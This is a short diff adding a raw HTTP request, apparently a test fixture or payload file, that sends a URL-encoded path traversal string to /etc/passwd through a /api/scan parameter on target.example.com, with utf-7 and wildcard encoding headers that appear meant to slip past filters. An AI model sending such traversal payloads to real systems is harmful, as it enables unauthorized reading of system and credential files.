@@ -1,0 +1,5 @@
+GET /api/scan?url=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
+Host: target.example.com
+Accept-Encoding: gzip, identity, *
+Accept-Charset: utf-7, utf-8
+
